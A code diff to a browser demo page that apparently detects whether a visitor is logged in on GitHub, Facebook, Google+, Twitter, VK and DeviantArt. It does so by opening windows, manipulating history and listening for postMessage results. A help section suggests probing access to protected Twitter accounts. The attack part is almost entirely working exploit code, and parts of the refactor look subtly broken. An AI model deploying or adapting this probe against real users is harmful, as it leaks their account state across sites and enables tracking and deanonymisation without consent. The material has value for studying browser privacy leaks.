@@ -7,9 +7,9 @@ var direct_history = false;
 var data_timeout = 2000;
 var full_debug = false;
 
-window.onmessage=function(e){
-  var guess = e.data.result == '2';
-  var id = parseInt(e.data.id);
+var postback = function(result,id){
+  var guess = result == '2';
+  var id = parseInt(id);
 
   if(full_debug) debug('Received: '+ guess + ' for '+id)
 
@@ -25,17 +25,20 @@ window.onmessage=function(e){
     //wins[e.data.id].w.history.go(guess ? 1 : 2)
   }
 }
+
+
+window.onmessage=postback;
+
 var debug=function(d){
   deb.innerHTML=deb.innerHTML+"<br>"+d;
 }
 
 var path_for = function(data){
-  if(data=='3'){
-    return 'data:text/html,<script>history.go(-3);<'+'/script>'
-  }else{
+  //if(data=='3'){
+  //  return 'data:text/html,<script>history.go(-3);<'+'/script>'
+  //}else{
     return '/postback.html?'+data;
-
-  }
+  //}
     //'data:text/html,<script>opener.postMessage({result: false,id:'+id+'},"*")<'+'/script>'
 }
 
@@ -65,16 +68,21 @@ var check_redirect = function(base, cb, assigner){
         // check exactly same URL
         wins[id].w.location = base+'#';
       }
+
+      if(direct_history){
+        wins[id].w.history.go(-2);
+      }else{
+        wins[id].w.location = path_for('3')
+      }
+
       setTimeout(function(){
-        if(direct_history){
-          wins[id].w.history.go(-2);
-        }else{
-          wins[id].w.location = path_for('3')
-        }
-      },100)
+        postback( wins[id].w.location.search.slice(1).split(',') );
+
+      },1000)
     },timeout)
   },data_timeout*2)
 }
+
 
 var run = function(){
   window.eval(ev.value)
@@ -91,37 +99,28 @@ direct_history=true;
 full_debug=true;
 timeout=10000;
 
-check_redirect('https://github.com/notifications', function(guess){
-  debug('Logged in on github: '+ (guess ? 'yes' : 'no'));
-})
 
-check_redirect('https://www.facebook.com/messages/new', function(guess){
-  debug('Logged in on fb: '+ (guess ? 'yes' : 'no'));
-})
-
-check_redirect('https://plus.google.com/photos/instantupload', function(guess){
-  debug('Logged in on google+: '+ (guess ? 'yes' : 'no'));
-})
-
-check_redirect('https://twitter.com/following', function(guess){
-  debug('Logged in on twitter: '+ (guess ? 'yes' : 'no'));
-})
-
-check_redirect('http://vk.com/friends', function(guess){
-  debug('Logged in on vk: '+ (guess ? 'yes' : 'no'));
-})
-check_redirect('http://my.deviantart.com/messages/', function(guess){
-  debug('Logged in on devianart: '+ (guess ? 'yes' : 'no'));
-})
-
+var sites = {
+  github: 'https://github.com/notifications',
+  fb: 'https://www.facebook.com/messages/new',
+  gplus: 'https://plus.google.com/photos/instantupload',
+  twitter: 'https://twitter.com/following',
+  vk: 'http://vk.com/friends',
+  devianart: 'http://my.deviantart.com/messages/'
+}
+var result = {}
+for(var site in sites){
+  check_redirect(sites[site], function(guess){
+    debug('Logged in on '+site+': '+ (guess ? 'yes' : 'no'));
+    result[site] = guess;
+  })  
+}
 
 </textarea>
-
 <b><div id="deb"></div></b>
 
 <pre>
 Other examples (you can copy code to textarea and press Run or simply use firebug/web inspector):
-
 
 check_redirect('https://twitter.com/PROTECTED/favorites', function(guess){
   debug('Has access to protected account: '+ (guess ? 'yes' : 'no'));
